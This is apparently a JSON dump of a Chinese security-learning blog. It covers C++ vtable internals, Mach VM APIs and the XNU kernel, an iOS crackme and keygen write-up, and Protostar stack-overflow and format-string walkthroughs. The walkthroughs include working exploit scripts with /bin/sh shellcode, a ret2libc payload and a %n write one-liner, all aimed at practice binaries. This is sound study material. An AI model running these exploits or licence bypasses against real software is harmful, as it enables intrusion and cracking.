12345(Fun)*((int*)*(int*)(&amp;b)+0); // Base::f()(Fun)*((int*)*(int*)(&amp;b)+1); // Base::g()(Fun)*((int*)*(int*)(&amp;b)+2); // Base::h() 这个时候你应该懂了吧。什么？还是有点晕。也是，这样的代码看着太乱了。没问题，让我画个图解释一下。如下所示： 注意：在上面这个图中，我在虚函数表的最后多加了一个结点，这是虚函数表的结束结点，就像字符串的结束符“\\0”一样，其标志了虚函数表的结束。这个结束标志的值在不同的编译器下是不同的。在WinXP+VS2003下，这个值是NULL。而在Ubuntu 7.10 + Linux 2.6.22 + GCC 4.1.3下，这个值是如果1，表示还有下一个虚函数表，如果值是0，表示是最后一个虚函数表。 下面，我将分别说明“无覆盖”和“有覆盖”时的虚函数表的样子。没有覆盖父类的虚函数是毫无意义的。我之所以要讲述没有覆盖的情况，主要目的是为了给一个对比。在比较之下，我们可以更加清楚地知道其内部的具体实现。 一般继承（无虚函数覆盖）下面，再让我们来看看继承时的虚函数表是什么样的。假设有如下所示的一个继承关系： 请注意，在这个继承关系中，子类没有重载任何父类的函数。那么，在派生类的实例中，其虚函数表如下所示：对于实例：Derive d; 的虚函数表如下：我们可以看到下面几点： 虚函数按照其声明顺序放于表中。 父类的虚函数在子类的虚函数前面。我相信聪明的你一定可以参考前面的那个程序，来编写一段程序来验证。 一般继承（有虚函数覆盖）覆盖父类的虚函数是很显然的事情，不然，虚函数就变得毫无意义。下面，我们来看一下，如果子类中有虚函数重载了父类的虚函数，会是一个什么样子？假设，我们有下面这样的一个继承关系。 为了让大家看到被继承过后的效果，在这个类的设计中，我只覆盖了父类的一个函数：f()。那么，对于派生类的实例，其虚函数表会是下面的一个样子： 我们从表中可以看到下面几点， 覆盖的f()函数被放到了虚表中原来父类虚函数的位置。 没有被覆盖的函数依旧。这样，我们就可以看到对于下面这样的程序， 123Base *b = new Derive();b-&gt;f(); 由b所指的内存中的虚函数表的f()的位置已经被Derive::f()函数地址所取代，于是在实际调用发生时，是Derive::f()被调用了。这就实现了多态。 多重继承（无虚函数覆盖）下面，再让我们来看看多重继承中的情况，假设有下面这样一个类的继承关系。注意：子类并没有覆盖父类的函数。 对于子类实例中的虚函数表，是下面这个样子： 我们可以看到： 每个父类都有自己的虚表。 子类的成员函数被放到了第一个父类的表中。（所谓的第一个父类是按照声明顺序来判断的） 这样做就是为了解决不同的父类类型的指针指向同一个子类实例，而能够调用到实际的函数。 多重继承（有虚函数覆盖） 下面我们再来看看，如果发生虚函数覆盖的情况。 下图中，我们在子类中覆盖了父类的f()函数。 下面是对于子类实例中的虚函数表的图： 我们可以看见，三个父类虚函数表中的f()的位置被替换成了子类的函数指针。这样，我们就可以任一静态类型的父类来指向子类，并调用子类的f()了。如： 12345678910111213141516171819Derive d;Base1 *b1 = &amp;d;Base2 *b2 = &amp;d;Base3 *b3 = &amp;d;b1-&gt;f(); //Derive::f()b2-&gt;f(); //Derive::f()b3-&gt;f(); //Derive::f()b1-&gt;g(); //Base1::g()b2-&gt;g(); //Base2::g()b3-&gt;g(); //Base3::g() 安全性每次写C++的文章，总免不了要批判一下C++。这篇文章也不例外。通过上面的讲述，相信我们对虚函数表有一个比较细致的了解了。水可载舟，亦可覆舟。下面，让我们来看看我们可以用虚函数表来干点什么坏事吧。 一、通过父类型的指针访问子类自己的虚函数我们知道，子类没有重载父类的虚函数是一件毫无意义的事情。因为多态也是要基于函数重载的。虽然在上面的图中我们可以看到Base1的虚表中有Derive的虚函数，但我们根本不可能使用下面的语句来调用子类的自有虚函数： 123Base1 *b1 = new Derive();b1-&gt;f1(); //编译出错 任何妄图使用父类指针想调用子类中的未覆盖父类的成员函数的行为都会被编译器视为非法，所以，这样的程序根本无法编译通过。但在运行时，我们可以通过指针的方式访问虚函数表来达到违反C++语义的行为。（关于这方面的尝试，通过阅读后面附录的代码，相信你可以做到这一点） 二、访问non-public的虚函数另外，如果父类的虚函数是private或是protected的，但这些非public的虚函数同样会存在于虚函数表中，所以，我们同样可以使用访问虚函数表的方式来访问这些non-public的虚函数，这是很容易做到的。 如： 1234567891011121314151617181920212223class Base &#123;private:virtual void f() &#123; cout &lt;&lt; \"Base::f\" &lt;&lt; endl; &#125;&#125;;class Derive : public Base&#123;&#125;;typedef void(*Fun)(void);void main() &#123;Derive d;Fun pFun = (Fun)*((int*)*(int*)(&amp;d)+0);pFun();&#125; 结束语C++这门语言是一门Magic的语言，对于程序员来说，我们似乎永远摸不清楚这门语言背着我们在干了什么。需要熟悉这门语言，我们就必需要了解C++里面的那些东西，需要去了解C++中那些危险的东西。不然，这是一种搬起石头砸自己脚的编程语言。 文章转载：http://www.cppblog.com/dawnbreak/archive/2009/03/10/76084.aspx","tags":[{"name":"C++","slug":"C","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/C/"},{"name":"vtable","slug":"vtable","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/vtable/"}]},{"title":"cve-2016-1757","date":"2017-03-05T03:12:19.000Z","path":"2017/03/05/CVE-2016-1757/cve-2016-1757/","text":"","tags":[{"name":"cve","slug":"cve","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/cve/"},{"name":"IPC","slug":"IPC","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/IPC/"},{"name":"vm","slug":"vm","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/vm/"}]},{"title":"Mach vm*API","date":"2017-03-04T17:51:44.000Z","path":"2017/03/05/Mach vm*API/exec函数流程/","text":"exec函数流程 mach_vm_* mach_vm_cllocate 1mach_vm_allocate(vm_map_t map,mach_vm_address_t *address,mach_vm_size_t size,int flags); 在map中分配size个字节大小的内存，根据flags的不同会有不同的处理方式。address是一个I/O的参数（例如：获取分配后的内存大小）。如果flags的值不是VM_FLAGS_ANYWHERE，那么内存将被分配到address指向的地址。 mach_vm_region123456789kern_return_tmach_vm_region( vm_map_t map, mach_vm_offset_t *address, /* IN/OUT */ mach_vm_size_t *size, /* OUT */ vm_region_flavor_t flavor, /* IN */ vm_region_info_t info, /* OUT */ mach_msg_type_number_t *count, /* IN/OUT */ mach_port_t *object_name) /* OUT */ 获取map指向的任务内，address地址起始的VM region（虚拟内存区域）的信息。目前标记为flavor只有VM_BASIC_INFO_64。获得的info的数据结构如下。12345678910struct vm_region_basic_info_64 &#123; vm_prot_t protection; vm_prot_t max_protection; vm_inherit_t inheritance; boolean_t shared; boolean_t reserved; memory_object_offset_t offset; vm_behavior_t behavior; unsigned short user_wired_count;&#125;; mach_vm_protect1234567kern_return_tmach_vm_protect( mach_port_name_t task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection) 对address到address+size这一段的内存设置内存保护策略,new_protection就是最后设置成为的保护机制。 mach_vm_write123456kern_return_tmach_vm_write( vm_map_t map, mach_vm_address_t address, pointer_t data, __unused mach_msg_type_number_t size) 对address指向的内存改写内容。 mach_vm_read1234567kern_return_t mach_vm_read( vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt); 对address指向的内存读取内容. mach_port_* mach_port_allocate12345kern_return_t mach_port_allocate( ipc_space_t task, mach_port_right_t right, mach_port_name_t *name); task指要分配端口的任务(mach_task_self())，right指分配给该端口的权限，name指代分配端口名的地址Ports有如下权限，Ports可以在不同的task之间传递，通过传递可以赋予其他task对ports的操作权限。例如POC中使用的就是在父进程与子进程之间传递Port得到了对内存操作的权限。 1234567#define MACH_PORT_RIGHT_SEND ((mach_port_right_t) 0)#define MACH_PORT_RIGHT_RECEIVE ((mach_port_right_t) 1)#define MACH_PORT_RIGHT_SEND_ONCE ((mach_port_right_t) 2)#define MACH_PORT_RIGHT_PORT_SET ((mach_port_right_t) 3)#define MACH_PORT_RIGHT_DEAD_NAME ((mach_port_right_t) 4)#define MACH_PORT_RIGHT_LABELH ((mach_port_right_t) 5)#define MACH_PORT_RIGHT_NUMBER ((mach_port_right_t) 6) mach_port_insert_right123456kern_return_t mach_port_insert_right( ipc_space_t task, mach_port_name_t name, mach_port_t poly, mach_msg_type_name_t polyPoly); 参考 http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/ https://developer.apple.com","tags":[{"name":"vm","slug":"vm","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/vm/"},{"name":"macOS内核","slug":"macOS内核","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/macOS内核/"},{"name":"mach","slug":"mach","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/mach/"}]},{"title":"macOS内核知识点整理","date":"2016-12-05T16:34:52.000Z","path":"2016/12/06/macOS内核框架/macOS内核架构-功能/","text":"Darwin结构 沙盒结构 XNU源码树 目录 包含的内容 bsd 内核的BSD组件 config 各种框架的导出符号 iokit I/OKit驱动程序运行时子系统 libkern 内核主运行时库API osfmk 内核的Mach组件 pexpert 平台相关的服务（PPC,i386） security BSD MAC框架 BSD子目录 子目录 包含的内容 bsm/security Basic Security Module(审计子系统) conf 机器相关的Makefile crypto 对称加密算法和散列算法的实现 dev BSD设备（/dev目录项） hfs macOS默认文件系统（HFS/HFS+） i386/machine Intel/PPC架构的私有头文件 kern 内核的主要代码 libkern 内核运行时导出的库（CRC,字符串函数等） man 一些有用的man手册 net*/netinet 网络子系统（套接字）和IP协议栈 nfs 用于远程文件系统的NFSv3协议栈 sys 内核头文件 vfs 虚拟文件系统交换（Virtual Filesystem Switch） vm BSD的虚拟内存处理程序 osfmk子目录 子目录 包含的内容 chud Computer Hardware Understanding Development(为macOS诊断工具提供内核支持) conf 机器相关的Makefile console 控制台初始化,串口,引导视频和内核崩溃 ddb 内核调试器（已弃用） default_pager VM分页器 device Mach对I/OKit和设备的支持 i386/ppc/x86_64 CPU特定的实现 ipc IPC,port和消息 kdp KDP(调试器)支持 mach,machine Mach通用头文件和机器相关的内核头文件 man 唯一涉及到Mach调用的man手册 pmc/profiling PMC性能检测 UserNotification 内核到用户态的通知 vm 虚拟内存的实现和头文件 the xnu Kernal of following component Mach servers layer BSD primary systerm programming interface provide The I/OKit runtime environment for drivers libkernal in* kernel library libsaan in* kernel library that is normally used only during early systerm startup the platform expert hardware abstraction module kernel extension various I/OKit family,the majority of loadable device drivers,and some non* I/O Kit extention MachIf the xnu kernel is the core of Mac OS X, then Mach may be considered the core of xnu. hardware abstraction to some extent processor management including symmetric mutiprocessing * and scheduling Preemptive multitasking, including support for tasks and threads Virtual memory management, including low-level paging, memory protection, sharing, and inheritance$Low-level IPC mechanisms that are the basis for all messaging in the kernel Real-time support that allows time-sensitive applications (e.g., media applications such asGarageBand and iTunes) to have latency-bounded access to processor resources Kernel debugging support Console I/O BSD BSD-style process model Signals User IDs, permissions, and basic security policies POSIX APIs Asynchronous I/O APIs (AIO) BSD-style system calls TCP/IP stack, BSD sockets, and firewalling Network Kernel Extensions (NKEs), a type of kernel extension for making the BSD networking architecture fit into xnu[11] The virtual file system (VFS) layer and numerous file systems, including a file-system-independent VFS-level journaling mechanism System V and POSIX interprocess communication mechanisms In-kernel cryptographic framework A system notification mechanism based on FreeBSD’s kqueue/kevent mechanism, which is a system-wide service enabling notifications between applications, and from the kernel to applications The fsevents file system change notification mechanism that is used by the Spotlight search technology Access control lists (ACLs) and the kauth authorization framework Various synchronization primitives The I/O Kit Extensive programming interfaces, including interfaces for applications and user* space drivers to communicate with the I/O Kit Numerous device families such as ATA/ATAPI, FireWire, Graphics, HID, Network, PCI, and USB Object* oriented abstractions of devices Plug-and-play and dynamic device management (“hot-plugging”) Power management Preemptive multitasking, threading, symmetric multiprocessing, memory protection, and data management Dynamic matching and loading of drivers for multiple bus types A database for tracking and maintaining detailed information on instantiated objects (the I/O Registry) A database of all I/O Kit classes available on a system (the I/O Catalog)Interfaces for applications and user-space drivers to communicate with the I/O Kit Driver stacking The libkern Library Dynamic allocation, construction, and destruction objects, with support for a variety of built-in object types such as Arrays, Booleans, and Dictionaries Atomic operations and miscellaneous functions such as bcmp(), memcmp(), and strlen() Functions for byte-swapping Provisions for tracking the number of current instances for each class Mechanisms that help alleviate the C++ fragile base-class problem The libsa Librarylibsa is an in-kernel support library essentially an in* kernel linkerused during early system startup for loading kernel extensions,sa=stand-alone,Mac OS X kernel extensions are normally loaded on demand through the kexTD user-space daemon (/usr/libexec/kextd). During early stages of bootstrapping, kextd is not yet available. libsa provides a subset of kextd’s capabilities to the kernel. Examples of specific functionality implemented by libsa for loading, linking, and recording kernel extension object files include the following: Simple memory allocation Binary searching Sorting Miscellaneous string* handling functions  Symbol remangling A dependency graph package used while determining kernel extension dependencies Decompression of compressed kernels and verification of checksums The Platform ExpertNubs[In the context of the I/O Kit, a nub is an object that defines an access point and communication channel for a physical device or a logical service. A physical device could be a bus, a disk drive or partition, a graphics card, and so on. Examples of logical services include arbitration, driver matching, and power management.] Constructing device trees Parsing certain boot arguments Identifying the machine, which includes determining processor and bus clock speeds  Accessing power management information Retrieving and setting system time Retrieving and setting console information Halting and restarting the machine Accessing the interrupt controller Creating the system serial number string Saving kernel panic information Initializing a “user interface” to be used in case of kernel panics Reading and writing the nonvolatile memory (NVRAM) Reading and writing the parameter memory (PRAM) task and thread任务是一个包含一个或多个可执行线程的任务组，这些线程共享资源和内存空间。Mach的任务是将一对一映射到Unix BSD层的进程。XNU内核也是一个包含多个线程的任务。","tags":[{"name":"xnu","slug":"xnu","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/xnu/"},{"name":"macos内核","slug":"macos内核","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/macos内核/"},{"name":"BSD","slug":"BSD","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/BSD/"}]},{"title":"看雪iOSCrackme破解报告","date":"2016-08-04T17:51:44.000Z","path":"2016/08/05/iOSCrackme/iOSCrackme/","text":"看雪iOSCrackme破解报告0x01.首先，利用classdump把crackme的头文件导出来，可以看到头文件只有6个，根据屏幕上的check按钮，很容易在控制器中找到如下函数 0x02.然后将可执行文件拉入IDA分析，直接跳到check这个函数。可以猜测这个函数应该就是加密函数。下面重点对这个函数进行详细分析。 0x03.在分析之前，先在手机屏幕上直接点击check，无反应。然后输入一定字符后再点击check，仍然没有反应。没有一点的错误提示，看来只能一步一步看汇编了。在IDA中先大概看下流程图的结构，拉到最底下，发现貌似成功的界面 不管怎样，先试试直接跳转到该地址，看能不能弹出成功的界面？: / 修改为B 0x0000C1AC 然后再屏幕上点击check，成功弹出welcome to kanxue的界面！再接再厉,看看中间都经历了什么步骤。 0x04.下面进入汇编，第一阶段，根据strlen函数很容易知道，这是在对用户输入的字符串进行长度判断，若不满足情况，直接跳到失败代码。name为14位，serialnumber为8位 既然是逆向工程，所以先分析下在弹出这个界面前的代码都在做写些什么,r11为我们输入的serialnumber然后可以发现如果栈中的值和serialnumber8次匹配成功就会弹出成功的界面。 0x05.一段插曲，不知道是程序自身的原因还是手机的问题，在一步步向下调试的时候，发现内存非法访问，为什么会出现这个问题呢？向上找的时候，发现这样一条指令MOV PC, PC按理说，根据arm处理器流水线的处理机制，PC会指向当前的下面两条指令，所以执行这条语句后应该会跳到VDUP.8 Q9, R1指令. 但是实际情况却是把拆成四条指令，并把r0的值变为了0，导致r2变化，从而非法访问了r2地址的内存。 所以为了让r0的值不改变,之前都是通过每次动态修register write $r0的值，导致每次调试都要在那两处下个断点，浪费了很多时间。后来直接把静态修改重新打包安装到手机，lsls r0 r0改为nop代替，同理下面还有一处，作相应的修改。 0x06.回到我们之前的分析，现在开始加密阶段，首先进入的是下面的一个循环 r0的值为栈中的某个地址，d18-d19的值为00-0f，然后循环了16次，每次都对d18-d19加一，所以循环结束后在栈中生成了一个16*16大小的矩阵，且值为00-ff. 0x07.接着往下面分析，又是一个循环。循环了256次，可以猜测应该是对上面的矩阵进行变换，分析可以发现这个循环通过r9(0xaaaaaaab)和r1相乘结果来对矩阵中的值进行交换。 在循环的结束的下一条地址下个断点，打印对应的内存，验证了我们的猜想。 我们之前的分析中好像还没有和我们输入的name和serialnumber有什么联系。接着分析，这个循环终于对name进行了存取操作，通过四次循环把name的前四位取出来与之前的矩阵加密后又放回到name的前四位。 内存图： 下面这一段有点繁琐，各种跳转，但是并不复杂，就是通过判断加密后的name的长度然后复制到栈中地址r8处。 接着又是一个循环，分析可知是对r8即刚才复制加密name后的内存进行每四位反序变换。 内存图： keep going！这一段不是很复杂，就是把刚才变换后的首地址r8向下的64个字节复制到内存栈中[sp 0x50]处。后来得知从这个地址到r8后的内存就是整个栈变化的结束，后面的四个循环并没有进行栈的存操作，只是将这块内存的值取出来加密。 内存图： 下面的四个循环很相似，都是将那块内存每次提取80个字节进行加密。刚好有80*4=320与内存块的字节数相同。 然后将这之后的寄存器值与对应的值相加spintf按%08x%08x%08x%08x%08x的格式写入栈。 最后对栈进行了5次存储，与后面分析可知这段内存就会与serialnumber进行匹配。 0x07.根据上面的步骤写出代码，注册机为一个命令行程序，运行程序会提示如数14位的字母和数字的字符串，然后根据此就会生成对应的serialnumber。效果图如下： 在手机中输入生成的name和serialnumber弹出成功的界面！","tags":[{"name":"Crackme","slug":"Crackme","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Crackme/"},{"name":"看雪","slug":"看雪","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/看雪/"},{"name":"iOS","slug":"iOS","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/iOS/"}]},{"title":"Protostar-栈溢出系列学习-Stack 3","date":"2016-08-01T03:12:19.000Z","path":"2016/08/01/Protostar-栈溢出系列学习-Stack 3/Protostar-栈溢出系列学习-Stack 3/","text":"0x00 序和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存放的shellcode。这次，我们做了一些栈上的限制，比如现在的操作体系都会有DSP，ASLR等保护。本文就借此来学习一些ROP的知识。 0x01 stack3stack3 123456789101112131415161718192021222324252627282930#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void getpath()&#123; char buffer[64]; unsigned int ret; printf(\"input path please: \"); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xbf000000) == 0xbf000000) &#123; printf(\"bzzzt (%p)\\n\", ret); _exit(1); &#125; printf(\"got path %s\\n\", buffer);&#125;int main(int argc, char **argv)&#123; getpath();&#125; 0x02 思路&amp;分析整体上和前面的没太大区别，现在有个问题在于__builtin_return_address()会返回当前的返回地址值，然后后面ret &amp; 0xbf000000) == 0xbf000000对其返回地址进行了限制–返回地址不能是0xbf为前缀，正好是栈的前缀。这样的话就不能像之前那样直接返回到栈中，也不能执行栈上的shellcode。 怎么绕过呢？ Ret2libc or ROP(return orientated programming) 0x03 ROP一个巧妙的方法在于我们不直接返回到栈中执行shellcode，而是返回到原本的程序之中。这里我们返回到getpath()的ret指令处。在后面在存放shellcode，而再次执行ret时就会跳转到后面执行我们的shellcode。 getpath()汇编123456789101112131415161718192021222324252627282930313233Dump of assembler code for function getpath:0x08048484 &lt;getpath+0&gt;: push ebp0x08048485 &lt;getpath+1&gt;: mov ebp,esp0x08048487 &lt;getpath+3&gt;: sub esp,0x680x0804848a &lt;getpath+6&gt;: mov eax,0x80485d00x0804848f &lt;getpath+11&gt;: mov DWORD PTR [esp],eax0x08048492 &lt;getpath+14&gt;: call 0x80483c0 &lt;printf@plt&gt;0x08048497 &lt;getpath+19&gt;: mov eax,ds:0x80497200x0804849c &lt;getpath+24&gt;: mov DWORD PTR [esp],eax0x0804849f &lt;getpath+27&gt;: call 0x80483b0 &lt;fflush@plt&gt;0x080484a4 &lt;getpath+32&gt;: lea eax,[ebp-0x4c]0x080484a7 &lt;getpath+35&gt;: mov DWORD PTR [esp],eax0x080484aa &lt;getpath+38&gt;: call 0x8048380 &lt;gets@plt&gt;0x080484af &lt;getpath+43&gt;: mov eax,DWORD PTR [ebp+0x4]0x080484b2 &lt;getpath+46&gt;: mov DWORD PTR [ebp-0xc],eax0x080484b5 &lt;getpath+49&gt;: mov eax,DWORD PTR [ebp-0xc]0x080484b8 &lt;getpath+52&gt;: and eax,0xbf0000000x080484bd &lt;getpath+57&gt;: cmp eax,0xbf0000000x080484c2 &lt;getpath+62&gt;: jne 0x80484e4 &lt;getpath+96&gt;0x080484c4 &lt;getpath+64&gt;: mov eax,0x80485e40x080484c9 &lt;getpath+69&gt;: mov edx,DWORD PTR [ebp-0xc]0x080484cc &lt;getpath+72&gt;: mov DWORD PTR [esp+0x4],edx0x080484d0 &lt;getpath+76&gt;: mov DWORD PTR [esp],eax0x080484d3 &lt;getpath+79&gt;: call 0x80483c0 &lt;printf@plt&gt;0x080484d8 &lt;getpath+84&gt;: mov DWORD PTR [esp],0x10x080484df &lt;getpath+91&gt;: call 0x80483a0 &lt;_exit@plt&gt;0x080484e4 &lt;getpath+96&gt;: mov eax,0x80485f00x080484e9 &lt;getpath+101&gt;: lea edx,[ebp-0x4c]0x080484ec &lt;getpath+104&gt;: mov DWORD PTR [esp+0x4],edx0x080484f0 &lt;getpath+108&gt;: mov DWORD PTR [esp],eax0x080484f3 &lt;getpath+111&gt;: call 0x80483c0 &lt;printf@plt&gt;0x080484f8 &lt;getpath+116&gt;: leave 0x080484f9 &lt;getpath+117&gt;: ret 调试&amp;hack测试返回地址等在这里就省略了，还不明白的可以看前面的系列。这里先看下python脚本。 1234567import structpadding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'ret = struct.pack(\"I\", 0x080484f9)eip_after_ret = struct.pack(\"I\", 0xbffff78c+40)nopslide = '\\x90'*100payload = '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'print padding+ret+eip_after_ret+nopslide+payload 这里的ret返回地址我们改为了0x080484f9正是ret指令处的地址。eip_after_ret为真正在栈上跳转的执行地址，当然我们也加入了nopslide。 here we go! 成功运行bash！ 0x04 Ret2libc这次我们通过返回到libc里面的函数达到执行shell的目的。这里采用system(&quot;/bin/sh&quot;)。所以我们需要跳转到system函数，但同时要满足x86传参方式即要先将字符串&quot;/bin/sh&quot;压入栈中。下面我们就来做两件事： * 1，找到system在内存中的地址 * 2，找到字符串`&quot;/bin/sh&quot;`在内存中的地址 system &amp; &quot;/bin/sh&quot; 先找到/lib/libc-2.11.2.so在内存中的位置 然后找到字符串&quot;/bin/sh&quot;在/lib/libc-2.11.2.so中的偏移 验证：所以&quot;/bin/sh&quot;为0xb7fb63bf hack编写对应的Python脚本 1234567import structpadding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'system = struct.pack(\"I\",0xb7ecffb0) #system地址ret_after_system = 'AAAA' #返回地址，不重要bin_sh = struct.pack(\"I\", 0xb7fb63bf) #参数/bin/sh地址print padding+system+ret_after_system+bin_sh 测试 cooooool! make it!0x05 小结学习到现在，一句话总结就是：你知道得越多才知道知道得越少。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出系列学习-format 0","date":"2016-07-10T03:12:19.000Z","path":"2016/07/10/Protostar-栈溢出系列学习-format 0/Protostar-栈溢出系列学习-format 0/","text":"0x00 序从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。 0x01 format 0C语言代码 1234567891011121314151617181920#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int target;void vuln(char *string)&#123; printf(string); if(target) &#123; printf(\"you have modified the target :)\\n\"); &#125;&#125;int main(int argc, char **argv)&#123; vuln(argv[1]);&#125; 0x02 疑惑&amp;分析&amp;思考拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量target的值。但好像除了printf()函数，就没有其他可疑的地方了。what fuck？ 一个printf()函数怎么会有漏洞？ 但仔细观察可以发现这次printf的用法有点奇怪，直接打印一个字符串地址，很少会这样用，会不会就是这里？？？ 0x03 测试其他不说，先运行下程序试试再试着输入格式字符试试很奇怪，我们貌似得到一些栈中的值，再多打印一些试试可以看到后面打印出来了%x本身&lt;—20782520，通过linux stack layout可得知后面的确保存着参数字符串 123456789101112131415161718...local variables of mainsaved registers of mainreturn address of mainargcargvenvpstack from startup codeargcargv pointersNULL that ends argv[]environment pointersNULL that ends envp[]ELF Auxiliary Tableargv strings &lt;--------focus hereenvironment stringsprogram nameNULL 更多关于linux栈布局 0x04 你不知道的printf虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？ 关注printf函数，有这么一段话： Code such as printf(foo); often indicates a bug, since foo may contain a % character. If foo comes from untrusted user input, it may contain %n,causing the printf() call to write to memory and creating a security hole. 简单就是说%n可以写入一个内存地址，其值为前面的字符数 [n]The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is con‐verted. 看个例子这样的话就可以满足写入的问题了，现在的问题就是写入哪里，怎么写了 0x05 hack先利用objdump -t找到target的地址利用一句话Python反复测试1/opt/protostar/bin/format1 \"`python -c 'print \"A\"*4 + \"\\x38\\x96\\x04\\x08\" + \"BBB\"+\"%x \"*135\"'`\" 调整%x的个数，使其target地址为最后一个然后将最后一个%x改为%n1/opt/protostar/bin/format1 \"`python -c 'print \"A\"*4 + \"\\x38\\x96\\x04\\x08\" + \"BBB\"+\"%x \"*134+\"%n \"'`\" run!成功修改target值! 0x06 一点感悟总的来说，自己受到了一点震感。So amazing！没想到一个printf使用不当就可能造成这么严重的漏洞。继续学习吧！ 0x07 参考链接 更多关于linux栈布局 What is the use of the %n format specifier in C? Protostar/Format 1","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Protostar/"},{"name":"printf","slug":"printf","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/printf/"},{"name":"format","slug":"format","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/format/"}]},{"title":"Protostar-栈溢出系列学习-Stack 2","date":"2016-06-15T03:12:19.000Z","path":"2016/06/15/Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2/","text":"0x00 序经过前面的学习，我们已经了解了简单的栈溢出利用手段，建议看本文章前先看下前面的分析。这次我们来做点有趣的事，我们引入shellcode。 0x01 Protostar / Stack 2Stack5 is a standard buffer overflow, this time introducing shellcode. This level is at /opt/protostar/bin/stack5 Hints:At this point in time, it might be easier to use someone elses shellcodeIf debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debuggerremove the int3s once your shellcode is done. stack2.c 1234567891011#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv)&#123; char buffer[64]; gets(buffer);&#125; 0x02 思路&amp;分析和前面的一样，我们可以通过覆盖返回地址然后由ret指令跳转到目标地址，但这次我们没有了win()函数，那我们应该跳转到哪里呢？没错，还是跳到栈上。要达到执行代码的目的，所以我们需要在栈上写入shellcode。Here we go！ 0x03 调试&amp;hack 对应汇编，我们在0x080483da &lt;main+22&gt;: ret处下个断点 1234567891011(gdb) disassemble Dump of assembler code for function main:0x080483c4 &lt;main+0&gt;: push %ebp0x080483c5 &lt;main+1&gt;: mov %esp,%ebp0x080483c7 &lt;main+3&gt;: and $0xfffffff0,%esp0x080483ca &lt;main+6&gt;: sub $0x50,%esp0x080483cd &lt;main+9&gt;: lea 0x10(%esp),%eax0x080483d1 &lt;main+13&gt;: mov %eax,(%esp)0x080483d4 &lt;main+16&gt;: call 0x80482e8 &lt;gets@plt&gt;0x080483d9 &lt;main+21&gt;: leave 0x080483da &lt;main+22&gt;: ret 同样的方法，Python脚本测试返回地址 可以发现0xbffff79c处正是返回地址，对应到TTTT,我需要在TTTT处写上我们要跳转的地址。 既然题目中说了用int 3 cc指令那我们就先来测试下–[cc指令（见文章末尾）]我们成功执行了cc INT 3指令并触发 SIGTRAP 引入nop slide为什么需要nop slide?来看看这种情况，我们再启动一个终端去调试。发现地址里面内容一样，但地址却不同，为什么会这样呢？再看看整个栈的情况可以发现，在圈中之后的栈地址都相同，但由于工作路径不同，导致前面的栈地址都发生了变化。因此，我们需要引入nop slide去解决这种情况。 填写shellcode自此，我们可以加入我们的shellcode了。这里我用的这里的shellcode。 现在我们重新编写Python脚本，制作shellcode payload 我们已经跳转的地址已经变化了40字节，并加入100的nopslide偏移，然后再执行shellcode 运行测试的确执行了dash，但并没有出现运行结果，这里很容易困惑。不应该这样的啊？经过思考，原来我们执行了/bin/dash后，并没有输入任何数据，所以就退出了。 那怎么才能让执行后输入数据呢？这里有一个小技巧，在执行后用cat指令，将输入转到输出 so cool! make it!0x04 附录INT 3 CC 详细分分析可以看这边文章int 3中断与软件调试 简单的理解就是:当我们调试程序时，可以在可能有问题的地方插入一条INT 